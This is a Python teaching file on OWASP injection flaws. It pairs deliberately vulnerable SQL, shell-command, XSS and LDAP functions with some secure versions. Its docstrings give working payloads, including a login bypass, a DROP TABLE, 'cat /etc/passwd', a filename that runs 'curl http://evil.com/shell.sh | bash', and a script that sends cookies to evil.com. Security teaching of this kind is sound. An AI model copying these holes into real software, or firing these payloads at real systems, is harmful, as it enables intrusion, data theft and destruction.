"""
OWASP A03:2021 - Injection (SQL, Command, LDAP, XSS)
⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT USE IN PRODUCTION
"""

import sqlite3
import subprocess
import os
from flask import Flask, request, render_template_string

app = Flask(__name__)


# ============================================================
# VULNERABILITY 1: SQL Injection via string concatenation
# ============================================================

def get_user_vulnerable(username: str):
    """
    BUG: User input directly concatenated into SQL query.
    Payload: username = "' OR '1'='1" → returns ALL users.
    Payload: username = "'; DROP TABLE users;--" → destroys DB.
    """
    conn = sqlite3.connect("users.db")
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    print(f"[SQL] {query}")
    return conn.execute(query).fetchall()


def login_vulnerable(username: str, password: str) -> bool:
    """
    BUG: Classic login bypass via SQL injection.
    Payload: username = "admin'--"  → bypasses password check.
    """
    conn = sqlite3.connect("users.db")
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    result = conn.execute(query).fetchone()
    return result is not None


# ============================================================
# VULNERABILITY 2: OS Command Injection
# ============================================================

def ping_host_vulnerable(host: str) -> str:
    """
    BUG: User-controlled input passed directly to shell.
    Payload: host = "8.8.8.8; rm -rf /tmp/important"
    Payload: host = "8.8.8.8 && cat /etc/passwd"
    """
    result = subprocess.run(
        f"ping -c 1 {host}",      # BUG: shell=True + unsanitized input
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout


def convert_file_vulnerable(filename: str) -> str:
    """
    BUG: Filename is injected into a shell command.
    Payload: filename = "file.txt; curl http://evil.com/shell.sh | bash"
    """
    os.system(f"convert {filename} output.pdf")   # BUG: os.system with user input
    return "converted"


# ============================================================
# VULNERABILITY 3: Reflected XSS (injection into HTML)
# ============================================================

@app.route("/search")
def search_vulnerable():
    """
    BUG: Unsanitized query reflected directly into HTML.
    Payload: ?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
    """
    query = request.args.get("q", "")
    # BUG: render_template_string with unescaped user input
    html = f"<h1>Results for: {query}</h1>"
    return render_template_string(html)


# ============================================================
# VULNERABILITY 4: LDAP Injection
# ============================================================

def ldap_login_vulnerable(username: str, password: str):
    """
    BUG: LDAP filter built with unescaped user input.
    Payload: username = "*)(uid=*))(|(uid=*" → LDAP injection.
    """
    import ldap  # python-ldap
    conn = ldap.initialize("ldap://ldap.example.com")
    # BUG: input should be escaped with ldap.filter.escape_filter_chars()
    search_filter = f"(&(uid={username})(userPassword={password}))"
    result = conn.search_s("dc=example,dc=com", ldap.SCOPE_SUBTREE, search_filter)
    return len(result) > 0


# ============================================================
# SECURE versions (for reference)
# ============================================================

def get_user_secure(username: str):
    """CORRECT: Parameterized query — input never touches SQL syntax."""
    conn = sqlite3.connect("users.db")
    return conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchall()


def ping_host_secure(host: str) -> str:
    """CORRECT: Pass args as list — no shell interpolation possible."""
    import re
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError("Invalid host")
    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True)
    return result.stdout
